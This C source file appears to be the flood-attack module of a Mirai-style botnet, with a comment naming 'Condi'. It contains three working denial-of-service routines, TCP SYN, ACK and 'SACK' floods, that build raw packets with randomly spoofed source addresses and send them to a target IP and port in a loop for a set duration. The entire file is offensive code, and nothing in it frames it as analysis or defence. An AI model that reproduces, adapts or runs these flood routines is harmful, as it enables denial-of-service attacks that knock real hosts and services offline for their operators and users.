#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>
#include <fcntl.h>

#include "attack.h"

// Checksum helper (reused from scanner logic ideally, but duplicated for standalone module)
static unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

void attack_tcp_sack(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    const int *val = &one;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        memset(packet, 0, 4096);
        
        // IP Header
        iph->ip_hl = 5;
        iph->ip_v = 4;
        iph->ip_tos = 0;
        iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 12; // +12 for options
        iph->ip_id = htonl(rand() % 65535);
        iph->ip_off = 0;
        iph->ip_ttl = 255;
        iph->ip_p = IPPROTO_TCP;
        iph->ip_src.s_addr = rand(); // Spoofed or Real? Condi often spoofs randomly /24
        iph->ip_dst.s_addr = ip;
        iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);

        // TCP Header
        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(port);
        tcph->th_seq = rand();
        tcph->th_ack = rand();
        tcph->th_off = 8; // 5 + 3 words (12 bytes) options
        tcph->th_flags = TH_ACK; // SACK relies on ACK being set
        tcph->th_win = htons(65535);
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        // Options: [NOP, NOP, SACK_PERMITTED] or similar
        // SACK Permitted: Kind=4, Length=2
        // Timestamp: Kind=8, Length=10
        // Window Scale: Kind=3, Length=3
        // Simple manual construction of options at end of TCP header
        uint8_t *opts = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct tcphdr));
        
        // SACK Permitted (2 bytes)
        opts[0] = 4; opts[1] = 2; 
        
        // Timestamp (10 bytes)
        opts[2] = 8; opts[3] = 10;
        *(uint32_t*)(opts + 4) = htonl(time(NULL));
        *(uint32_t*)(opts + 8) = 0;

        // Pseudo Header for Checksum
        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + 12);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 12;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + 12);
        
        tcph->th_sum = csum((unsigned short*)pseudogram, psize);
        free(pseudogram);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}

void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;

    // Pre-fill IP Header (mostly static)
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 4; // +4 for MSS option
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_dst.s_addr = ip;

    while (time(NULL) < end_time) {
        iph->ip_src.s_addr = rand(); // Spoof Random Source
        iph->ip_id = htonl(rand() % 65535);
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);

        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(port);
        tcph->th_seq = rand();
        tcph->th_ack = 0;
        tcph->th_off = 6; // 5 + 1 word (4 bytes MSS)
        tcph->th_flags = TH_SYN;
        tcph->th_win = htons(64240);
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        // MSS Option (Kind=2, Len=4, Value=1460)
        uint8_t *opts = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct tcphdr));
        opts[0] = 2; opts[1] = 4;
        *(uint16_t*)(opts + 2) = htons(1460);

        // Checksum
        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + 4);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + 4;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + 4);
        
        tcph->th_sum = csum((unsigned short*)pseudogram, psize);
        free(pseudogram);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}

void attack_tcp_ack(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[4096];
    struct ip *iph = (struct ip *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct ip));
    struct pseudo_header psh;

    time_t end_time = time(NULL) + duration;

    // IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr); // No options for bare ACK
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_dst.s_addr = ip;

    while (time(NULL) < end_time) {
        iph->ip_src.s_addr = rand(); 
        iph->ip_id = htonl(rand() % 65535);
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, iph->ip_len);

        tcph->th_sport = htons(rand() % 65535);
        tcph->th_dport = htons(port);
        tcph->th_seq = rand();
        tcph->th_ack = rand(); // Random Acknowledgement
        tcph->th_off = 5; 
        tcph->th_flags = TH_ACK;
        tcph->th_win = htons(64240);
        tcph->th_sum = 0;
        tcph->th_urp = 0;

        // Checksum
        psh.source_address = iph->ip_src.s_addr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->th_sum = csum((unsigned short*)pseudogram, psize);
        free(pseudogram);

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}
